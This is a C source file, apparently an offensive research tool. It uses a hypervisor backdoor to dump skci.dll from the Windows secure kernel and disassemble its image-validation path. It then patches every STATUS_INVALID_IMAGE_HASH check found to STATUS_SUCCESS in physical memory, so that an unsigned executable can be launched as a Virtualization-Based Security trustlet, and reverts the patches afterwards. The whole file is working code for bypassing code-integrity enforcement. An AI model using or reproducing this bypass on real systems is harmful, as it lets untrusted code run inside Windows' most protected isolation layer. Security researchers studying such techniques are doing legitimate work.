#include "stdafx.h"

/*
    This flag allows secure processes, that run in the Virtualization-Based
    Security environment, to launch.
*/
#ifndef CREATE_SECURE_PROCESS
#define CREATE_SECURE_PROCESS 0x00400000
#endif

// disassembly flags
#define F_QUEUED        0x01    // location is queued for disassembly
#define F_PROCESSED     0x02    // location was already disassembled
#define F_FUNCTION      0x04    // start of the function
#define F_FOUND         0x08    // instruction to patch was found

#define ASM_INT_3 0xcc

// x86_64 maximum instruction length
#define MAX_INST_LEN 15

#define MAP_SET(_rva_, _f_) map[(_rva_)] |= (_f_)
#define MAP_GET(_rva_, _f_) (map[(_rva_)] & (_f_))

#define STATUS_INVALID_IMAGE_HASH   0xc0000428
#define STATUS_SUCCESS              0x00000000

#ifdef DBG_DIS

// print debug messages during diassembly
#define dbg_printf_dis printf

#else

#define dbg_printf_dis

#endif

extern bool m_quiet;

HANDLE m_rpc_thread = NULL;
//--------------------------------------------------------------------------------------
int skci_disasm_iteration(uint8_t *map, uint8_t *image, int image_size)
{
    int count = 0;
    ud_t ud_obj;

    // initialize disassembler engine
    ud_init(&ud_obj);
    ud_set_mode(&ud_obj, 64);
    ud_set_vendor(&ud_obj, UD_VENDOR_INTEL);

    while (true)
    {
        int32_t addr = 0;

        // find queued location
        for (int32_t i = 0; i < image_size; i += 1)
        {
            if (MAP_GET(i, F_QUEUED) != 0 && MAP_GET(i, F_PROCESSED) == 0)
            {
                // location was not processed yet
                addr = i;
                break;
            }
        }

        if (addr == 0)
        {
            // no more locations to process
            break;
        }

        // perform disassembly
        while (true)
        {
            // mark current instruction as processed
            MAP_SET(addr, F_PROCESSED);

            count += 1;
            ud_set_input_buffer(&ud_obj, image + addr, MAX_INST_LEN);

            // get length of instruction
            int len = ud_disassemble(&ud_obj);
            if (len == 0)
            {
                // error while disassembling instruction      
                printf("Bad instruction at RVA 0x%x\n", addr);
                break;
            }

            if (ud_obj.operand[0].type == UD_OP_JIMM)
            {
                // call/jmp/jxx with relative address
                int32_t addr_dst = addr + ud_obj.operand[0].lval.sdword + len;
                if (addr_dst < image_size)
                {
                    if (MAP_GET(addr_dst, F_PROCESSED) == 0)
                    {
                        // location was not processed yet                       
                        if (ud_obj.mnemonic == UD_Icall)
                        {
                            MAP_SET(addr_dst, F_FUNCTION);
                        }
                        else
                        {
                            MAP_SET(addr_dst, F_QUEUED);
                        }

                        dbg_printf_dis("UD_OP_JIMM instruction 0x%x -> 0x%x\n", addr, addr_dst);
                    }
                }
            }

            /* 
                Check for mov/and to the register with immediate value, example:

                    CiVerifyFileHashSignedFile:
                        
                        ...

                        mov     rdx, [rbp+28h]      ; 1-st hash
                        lea     rcx, [r14+7D0h]     ; 2-nd hash
                        mov     r8d, ebx            ; size
                        call    memcmp
                        neg     eax
                        sbb     esi, esi
                        and     esi, 0C0000428h     ; STATUS_INVALID_IMAGE_HASH to patch
                        jmp     short loc_1C004025E

                    loc_1C0040259:

                        mov     esi, 0C0000428h     ; STATUS_INVALID_IMAGE_HASH to patch

                        ...
            */
            if ((ud_obj.mnemonic == UD_Imov || ud_obj.mnemonic == UD_Iand) &&
                ud_obj.operand[0].type == UD_OP_REG && 
                ud_obj.operand[1].type == UD_OP_IMM && ud_obj.operand[1].size == 32)
            {
                if (ud_obj.operand[1].lval.sdword == STATUS_INVALID_IMAGE_HASH)
                {
                    // interesting instruction was found
                    MAP_SET(addr + len - sizeof(uint32_t), F_FOUND);

                    dbg_printf_dis("Interesting instruction at 0x%x\n", addr);
                }
            }            

            if (ud_obj.mnemonic == UD_Ijmp ||
                ud_obj.mnemonic == UD_Iret ||
                ud_obj.mnemonic == UD_Iretf ||
                ud_obj.mnemonic == UD_Iiretw ||
                ud_obj.mnemonic == UD_Iiretq ||
                ud_obj.mnemonic == UD_Iiretd ||
                ud_obj.mnemonic == UD_Iint3)
            {
                // end of the function thunk
                dbg_printf_dis("End of the thunk at 0x%x\n", addr);
                break;
            }

            // go to the next instruction
            addr += len;
        }
    }

    return count;
}
//--------------------------------------------------------------------------------------
uint8_t *skci_disasm(uint8_t *image, int image_size, int call_depth)
{    
    // locate entry point to disassembly
    uint32_t rva = LdrGetProcAddress(image, "SkciFinishImageValidation");
    if (rva == 0)
    {
        printf(__FUNCTION__"() ERROR: skci!SkciFinishImageValidation() was not found\n");
        return NULL;
    }

    printf("[+] skci!SkciFinishImageValidation() RVA is 0x%x\n", rva);

    // allocate memory for disassembly map
    uint8_t *map = (uint8_t *)malloc(image_size);
    if (map == NULL)
    {
        return NULL;
    }    

    memset(map, 0, image_size);    

    // queue skci!SkciFinishImageValidation()
    MAP_SET(rva, F_FUNCTION);

    for (int i = 0; i < call_depth; i += 1)
    {
        int call_count = 0;

        // find queued calls
        for (int32_t i = 0; i < image_size; i += 1)
        {
            if (MAP_GET(i, F_FUNCTION) != 0 && MAP_GET(i, F_PROCESSED) == 0)
            {
                // function was not processed yet
                MAP_SET(i, F_QUEUED);

                call_count += 1;

                dbg_printf_dis("Begin of the function at 0x%x\n", i);
            }
        }

        if (call_count == 0)
        {
            break;
        }

        // diassembly queued functions
        skci_disasm_iteration(map, image, image_size);                
    }

    return map;
}
//--------------------------------------------------------------------------------------
int skci_patch(uint64_t pml4, uint64_t ept, uint64_t image_addr, uint8_t *map, int image_size, uint32_t value)
{
    int patched = 0;

    // find locations to patch
    for (int32_t i = 0; i < image_size; i += 1)
    {
        if (MAP_GET(i, F_FOUND) != 0)
        {
            uint64_t addr_virt = image_addr + i, addr_phys = 0;

            m_quiet = true;

            // get location physical address
            if (backdoor_virt_translate(addr_virt, &addr_phys, pml4, ept) == 0)
            {
                printf("Patching location at address skci+%llx (phys: 0x%llx)\n", i, addr_phys);

                // patch immediate operand with status success constant
                if (backdoor_phys_write_32(addr_phys, value) == 0)
                {
                    patched += 1;
                }                
            }

            m_quiet = false;
        }
    }

    backdoor_invalidate_caches();

    return patched;
}
//--------------------------------------------------------------------------------------
int skci_dump(uint64_t *pml4, uint64_t *ept, uint64_t *image_addr, uint8_t **image, int *image_size)
{
    int skci_size = 0;    
    SK_INFO sk_info[SK_MAX_COUNT], *entry = &sk_info[0];
    uint64_t sk_addr_virt = 0, skci_addr_virt = 0, skci_addr_phys = 0;
    uint64_t pml4_addr = 0, ept_addr = 0;

    // collect secure kernel info
    if (backdoor_sk_info(sk_info, NULL) == 0)
    {
        pml4_addr = sk_info->Cr3;
        ept_addr = sk_info->EptAddr;

        // get skci.dll load address
        if (backdoor_sk_base(entry, &sk_addr_virt, &skci_addr_virt) == 0)
        {   
            printf("[+] securekernel.exe is at 0x%llx\n", sk_addr_virt);            

            m_quiet = true;

            // get skci.dll physical address
            if (backdoor_virt_translate(skci_addr_virt, &skci_addr_phys, pml4_addr, ept_addr) != 0)
            {
                printf(__FUNCTION__"() ERROR: unable to get skci.dll physical address\n");
            }

            m_quiet = false;

            printf("[+] skci.dll is at 0x%llx (phys: 0x%llx)\n", skci_addr_virt, skci_addr_phys);
        }
        else
        {
            printf(__FUNCTION__"() ERROR: unable to find secuke kernel base address\n");
        }
    }
    else
    {
        printf(__FUNCTION__"() ERROR: unable to get secuke kernel information\n");
    }

    if (skci_addr_phys == 0)
    {
        return -1;
    }

    uint8_t *headers = (uint8_t *)malloc(PAGE_SIZE);
    if (headers)
    {
        // read skci.dll image headers
        if (backdoor_phys_read(skci_addr_phys, headers, PAGE_SIZE) == 0)
        {
            IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER *)headers;
            if (dos_hdr->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
            {
                IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS *)RVATOVA(headers, dos_hdr->e_lfanew);

                // get image size
                skci_size = nt_hdr->OptionalHeader.SizeOfImage;

                printf("[+] skci.dll image size is 0x%x bytes\n", skci_size);
            }
            else
            {
                printf(__FUNCTION__"() ERROR: bad skci.dll image header\n");
            }
        }

        free(headers);
    }    

    if (skci_size == 0)
    {
        return -1;
    }

    // allocate memory to dump image
    uint8_t *buff = (uint8_t *)malloc(skci_size);
    if (buff)
    {
        int ptr = 0;
        uint64_t addr_virt = skci_addr_virt, addr_phys = 0;

        memset(buff, ASM_INT_3, skci_size);

        m_quiet = true;

        while (ptr < skci_size)
        {
            // get skci.dll physical address
            if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) == 0)
            {
                // dump memory page
                backdoor_phys_read(addr_phys, buff + ptr, PAGE_SIZE);
            }

            ptr += PAGE_SIZE;
            addr_virt += PAGE_SIZE;
        }

        m_quiet = false;

        *pml4 = pml4_addr;
        *ept = ept_addr;

        *image = buff;
        *image_addr = skci_addr_virt;
        *image_size = skci_size;        

        return 0;
    }

    return -1;
}
//--------------------------------------------------------------------------------------
/* 
    Memory allocation function for RPC.    
*/
void *__RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

/* 
    Memory deallocation function for RPC.
*/
void __RPC_USER midl_user_free(void *ptr)
{
    free(ptr);
}
//--------------------------------------------------------------------------------------
handle_t rpc_initialize(void)
{
    handle_t binding = NULL;
    RPC_CSTR binding_string = NULL;    

    // generate binding string
    RPC_STATUS status = RpcStringBindingCompose(
        NULL,
        (RPC_CSTR)TRUSTLET_RPC_PROT, NULL,
        (RPC_CSTR)TRUSTLET_RPC_NAME, NULL,
        &binding_string
    );
    if (status != RPC_S_OK)
    {        
        return NULL;
    }

    // create server binding handle
    status = RpcBindingFromStringBinding(binding_string, &binding);
    if (status != RPC_S_OK)
    {
        return NULL;
    }

    return binding;    
}

int rpc_uninitialize(handle_t binding)
{
    RPC_STATUS status = RpcBindingFree(&binding);
    if (status != RPC_S_OK)
    {
        return -1;
    }

    return 0;
}

int rpc_terminate(handle_t binding, unsigned long code)
{
    RpcTryExcept
    {
        // terminate trustlet
        Terminate(binding, code);
    }
    RpcExcept(1)
    {                
        // error occurred
        return -1;
    }
    RpcEndExcept

    return 0;
}

int rpc_get_identy_key(handle_t binding, uint8_t **key_data, size_t *key_size)
{
    IDENTY_KEY key;
    
    key.Buffer = NULL;
    key.BufferLength = 0;

    RpcTryExcept
    {        
        // get trustlet identy key
        RPC_STATUS status = GetIdentyKey(binding, &key);
        if (status != RPC_S_OK)
        {
            return -1;
        }

        *key_data = key.Buffer;
        *key_size = key.BufferLength;
    }
    RpcExcept(1)
    {                
        // error occurred
        return -1;
    }
    RpcEndExcept

    return 0;
}
//--------------------------------------------------------------------------------------
void test_trustlet_demo(HANDLE process)
{
    printf("[+] Creating RPC binding...\n");

    handle_t binding = rpc_initialize();
    if (binding)
    {
        uint8_t *key_data = NULL;
        size_t key_size = 0;

        printf("[+] Calling RPC server to obtain trustlet identy key...\n");

        // perform RPC call to get trustlet identy key
        if (rpc_get_identy_key(binding, &key_data, &key_size) == 0)
        {
            printf("[+] Trustlet identy key size is %d bytes\n", key_size);

            hexdump(key_data, (uint32_t)key_size, 0);
            free(key_data);
        }
        else
        {
            printf(__FUNCTION__"() ERROR: unable to get trustlet identy key\n");
        }

        printf("[+] Calling RPC server to terminate running trustlet...\n");

        // perform RPC call to terminate trustlet process
        if (rpc_terminate(binding, 0))
        {
            DWORD exit_code = 0;

            // wait for the process termination
            WaitForSingleObject(process, INFINITE);

            if (GetExitCodeProcess(process, &exit_code))
            {
                printf("[+] Secure process exit code is 0x%.8x\n", exit_code);
            }
            else
            {
                printf("GetExitCodeProcess() ERROR %d\n", GetLastError());
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: unable to terminate runing trustlet\n");
        }

        rpc_uninitialize(binding);
    }
    else
    {
        printf(__FUNCTION__"() ERROR: unable to create RPC server binding\n");
    }
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    if (argc < 2)
    {
        printf("USAGE: trustlet_loader.exe <executable_path>\n");
        return 0;
    }

    m_quiet = false;

    // run current thread only on 1-st CPU
    SetThreadAffinityMask(GetCurrentThread(), 1);

    int skci_size = 0;
    uint64_t skci_addr = 0;
    uint64_t pml4_addr = 0, ept_addr = 0;
    uint8_t *skci_image = NULL;

    // check if hypervisor backdoor is running
    if (backdoor_info(NULL) != NULL)
    {
        return -1;
    }

    printf("[+] Hyper-V backdoor is running\n");        

    // dump skci.dll from memory
    if (skci_dump(&pml4_addr, &ept_addr, &skci_addr, &skci_image, &skci_size) != 0)
    {
        printf(__FUNCTION__"() ERROR: unable to dump skci.dll image\n");
        return -1;
    }

    // disasm image and find locations to patch
    uint8_t *map = skci_disasm(skci_image, skci_size, 2);
    if (map)
    {
        int count_fn = 0, count_bb = 0, count_insn = 0;

        // collect information
        for (int32_t i = 0; i < skci_size; i += 1)
        {
            if (MAP_GET(i, F_PROCESSED) != 0)
            {
                count_insn += 1;

                if (MAP_GET(i, F_QUEUED) != 0)
                {
                    count_bb += 1;
                }

                if (MAP_GET(i, F_FUNCTION) != 0)
                {
                    count_fn += 1;
                }
            }                
        }

        printf(
            "[+] %d functions, %d basic blocks and %d instructions was disassembled\n",
            count_fn, count_bb, count_insn
        );

        // patch skci.dll image
        int patched = skci_patch(pml4_addr, ept_addr, skci_addr, map, skci_size, STATUS_SUCCESS);

        printf("[+] %d instructions was patched\n", patched);

        STARTUPINFO startup_info;
        PROCESS_INFORMATION process_info;
        char *path = argv[1];

        ZeroMemory(&process_info, sizeof(process_info));
        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);

        printf("[+] Trustlet executable path is \"%s\"\n", path);

        // create secure process
        BOOL success = CreateProcess(
            path, NULL, NULL, NULL, FALSE, CREATE_SECURE_PROCESS,
            NULL, NULL, &startup_info, &process_info
        );
        if (success)
        {
            printf("[+] Secure process %d started\n", process_info.dwProcessId);
        }
        else
        {
            printf("CreateProcess() ERROR %d\n", GetLastError());
        }

        // revert patches
        patched = skci_patch(pml4_addr, ept_addr, skci_addr, map, skci_size, STATUS_INVALID_IMAGE_HASH);

        printf("[+] %d instructions was restored\n", patched);

        free(map);
        
        if (success)
        {                    
            if (argc >= 3 && !strcmp(argv[2], "--test-demo"))
            {
                // perform some RPC calls to the demo trustlet
                test_trustlet_demo(process_info.hProcess);
            }            

            CloseHandle(process_info.hThread);
            CloseHandle(process_info.hProcess);
        }     

        printf("[+] Done\n");
    }      

	return 0;
}
//--------------------------------------------------------------------------------------
// EoF
